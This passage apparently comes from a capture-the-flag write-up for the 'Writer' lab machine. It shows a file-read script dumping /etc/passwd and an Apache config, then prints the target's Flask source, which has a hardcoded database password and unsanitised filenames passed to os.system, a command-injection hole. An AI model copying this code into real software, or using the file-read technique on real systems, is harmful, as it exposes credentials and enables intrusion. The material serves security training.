<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803111242.png" alt="[Pasted image 20210803111242.png]" /></p>

<p>Now we can read the file instantly without going through the trouble waiting.</p>

<p>From <code class="language-plaintext highlighter-rouge">/etc/passwd</code> we have two users</p>

<ol>
  <li>john -&gt; id 1001</li>
  <li>kyle -&gt; id 1000</li>
</ol>

<p>We know that apache2 is running on the machine so we try to read apache2 configuration and find out the actual path of the web application.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre>____ <span class="nv">$python</span> read.py 
<span class="o">&gt;</span>/etc/apache2/sites-enabled/000-default.conf
Welcome <span class="c"># Virtual host configuration for writer.htb domain</span>
&lt;VirtualHost <span class="k">*</span>:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        &lt;Directory /var/www/writer.htb&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        Alias /static /var/www/writer.htb/writer/static
        &lt;Directory /var/www/writer.htb/writer/static/&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
        LogLevel warn
        CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
&lt;/VirtualHost&gt;

<span class="c"># Virtual host configuration for dev.writer.htb subdomain</span>
<span class="c"># Will enable configuration after completing backend development</span>
<span class="c"># Listen 8080</span>
<span class="c">#&lt;VirtualHost 127.0.0.1:8080&gt;</span>
<span class="c">#       ServerName dev.writer.htb</span>
<span class="c">#       ServerAdmin admin@writer.htb</span>
<span class="c">#</span>
        <span class="c"># Collect static for the writer2_project/writer_web/templates</span>
<span class="c">#       Alias /static /var/www/writer2_project/static</span>
<span class="c">#       &lt;Directory /var/www/writer2_project/static&gt;</span>
<span class="c">#               Require all granted</span>
<span class="c">#       &lt;/Directory&gt;</span>
<span class="c">#</span>
<span class="c">#       &lt;Directory /var/www/writer2_project/writerv2&gt;</span>
<span class="c">#               &lt;Files wsgi.py&gt;</span>
<span class="c">#                       Require all granted</span>
<span class="c">#               &lt;/Files&gt;</span>
<span class="c">#       &lt;/Directory&gt;</span>
<span class="c">#</span>
<span class="c">#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env</span>
<span class="c">#       WSGIProcessGroup writer2_project</span>
<span class="c">#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py</span>
<span class="c">#        ErrorLog ${APACHE_LOG_DIR}/error.log</span>
<span class="c">#        LogLevel warn</span>
<span class="c">#        CustomLog ${APACHE_LOG_DIR}/access.log combined</span>
<span class="c">#</span>
<span class="c">#&lt;/VirtualHost&gt;</span>
<span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>

</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803111700.png" alt="[Pasted image 20210803111700.png]" /></p>

<p>Two directories exist as virtualhost, one of them is comment out. Let’s enumerate inside the directories and see if we can find any interesting files.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803111847.png" alt="[Pasted image 20210803111847.png]" /></p>

<p>Let’s read the <code class="language-plaintext highlighter-rouge">__init__.py</code> from writer folder as python imported writer</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803112105.png" alt="[Pasted image 20210803112105.png]" /></p>

<div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
<span class="kn">from</span> <span class="nn">mysql.connector</span> <span class="kn">import</span> <span class="n">errorcode</span>
<span class="kn">import</span> <span class="nn">mysql.connector</span>
<span class="kn">import</span> <span class="nn">urllib.request</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">PIL</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">UnidentifiedImageError</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span><span class="n">static_url_path</span><span class="o">=</span><span class="s">''</span><span class="p">,</span><span class="n">static_folder</span><span class="o">=</span><span class="s">'static'</span><span class="p">,</span><span class="n">template_folder</span><span class="o">=</span><span class="s">'templates'</span><span class="p">)</span>

<span class="c1">#Define connection for database
</span><span class="k">def</span> <span class="nf">connections</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="s">'admin'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'ToughPasswordToCrack'</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">database</span><span class="o">=</span><span class="s">'writer'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">connector</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">err</span><span class="p">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errorcode</span><span class="p">.</span><span class="n">ER_ACCESS_DENIED_ERROR</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Something is wrong with your db user name or password!"</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">err</span><span class="p">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errorcode</span><span class="p">.</span><span class="n">ER_BAD_DB_ERROR</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database does not exist"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Another exception, returning!"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">'Connection to DB is ready!'</span><span class="p">)</span>

<span class="c1">#Define homepage
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home_page</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM stories;"</span>
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/blog.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="c1">#Define about page
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/about'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/about.html'</span><span class="p">)</span>

<span class="c1">#Define contact page
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/contact'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">contact</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/contact.html'</span><span class="p">)</span>

<span class="c1">#Define blog posts
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/blog/post/&lt;id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">blog_post</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories WHERE id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM stories;"</span>
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
    <span class="n">stories</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'blog/blog-single.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="n">stories</span><span class="o">=</span><span class="n">stories</span><span class="p">)</span>

<span class="c1">#Define dashboard for authenticated users
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'dashboard.html'</span><span class="p">)</span>

<span class="c1">#Define stories page for dashboard and edit/delete pages
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">stories</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"Select * From stories;"</span>
    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'stories.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories/add'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">add_story</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]:</span>
            <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]</span>
            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/var/www/writer.htb/writer/static/img/'</span><span class="p">,</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
                <span class="n">image</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">):</span>
            <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
                    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv {} {}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
                    <span class="n">image</span> <span class="o">=</span> <span class="s">"{}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">)</span>
                    <span class="k">try</span><span class="p">:</span>
                        <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
                        <span class="n">im</span><span class="p">.</span><span class="n">verify</span><span class="p">()</span>
                        <span class="n">im</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/tmp/'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">image</span><span class="p">))</span>
                        <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
                    <span class="k">except</span> <span class="n">PIL</span><span class="p">.</span><span class="n">UnidentifiedImageError</span><span class="p">:</span>
                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">))</span>
                        <span class="n">error</span> <span class="o">=</span> <span class="s">"Not a valid image file!"</span>
                        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
                <span class="k">except</span><span class="p">:</span>
                    <span class="n">error</span> <span class="o">=</span> <span class="s">"Issue uploading picture"</span>
                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
        <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'author'</span><span class="p">)</span>
        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'title'</span><span class="p">)</span>
        <span class="n">tagline</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'tagline'</span><span class="p">)</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content'</span><span class="p">)</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);"</span><span class="p">,</span> <span class="p">{</span><span class="s">'author'</span><span class="p">:</span><span class="n">author</span><span class="p">,</span><span class="s">'title'</span><span class="p">:</span> <span class="n">title</span><span class="p">,</span><span class="s">'tagline'</span><span class="p">:</span> <span class="n">tagline</span><span class="p">,</span><span class="s">'content'</span><span class="p">:</span> <span class="n">content</span><span class="p">,</span> <span class="s">'image'</span><span class="p">:</span><span class="n">image</span> <span class="p">})</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard/stories'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'add.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/stories/edit/&lt;id&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">edit_story</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM stories where id = %(id)s;"</span><span class="p">,</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
        <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]:</span>
            <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'image'</span><span class="p">]</span>
            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/var/www/writer.htb/writer/static/img/'</span><span class="p">,</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
                <span class="n">image</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
                <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
                <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"UPDATE stories SET image = %(image)s WHERE id = %(id)s"</span><span class="p">,</span> <span class="p">{</span><span class="s">'image'</span><span class="p">:</span><span class="n">image</span><span class="p">,</span> <span class="s">'id'</span><span class="p">:</span><span class="nb">id</span><span class="p">})</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">error</span> <span class="o">=</span> <span class="s">"File extensions must be in .jpg!"</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">):</span>
            <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
                    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv {} {}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
                    <span class="n">image</span> <span class="o">=</span> <span class="s">"{}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">)</span>
                    <span class="k">try</span><span class="p">:</span>
                        <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
                        <span class="n">im</span><span class="p">.</span><span class="n">verify</span><span class="p">()</span>
                        <span class="n">im</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                        <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/tmp/'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">image</span><span class="p">))</span>
                        <span class="n">image</span> <span class="o">=</span> <span class="s">"/img/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
                        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
                        <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"UPDATE stories SET image = %(image)s WHERE id = %(id)s"</span><span class="p">,</span> <span class="p">{</span><span class="s">'image'</span><span class="p">:</span><span class="n">image</span><span class="p">,</span> <span class="s">'id'</span><span class="p">:</span><span class="nb">id</span><span class="p">})</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>

                    <span class="k">except</span> <span class="n">PIL</span><span class="p">.</span><span class="n">UnidentifiedImageError</span><span class="p">:</span>
                        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">image</span><span class="p">))</span>
                        <span class="n">error</span> <span class="o">=</span> <span class="s">"Not a valid image file!"</span>
                        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'edit.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
                <span class="k">except</span><span class="p">:</span>
                    <span class="n">error</span> <span class="o">=</span> <span class="s">"Issue uploading picture"</span>
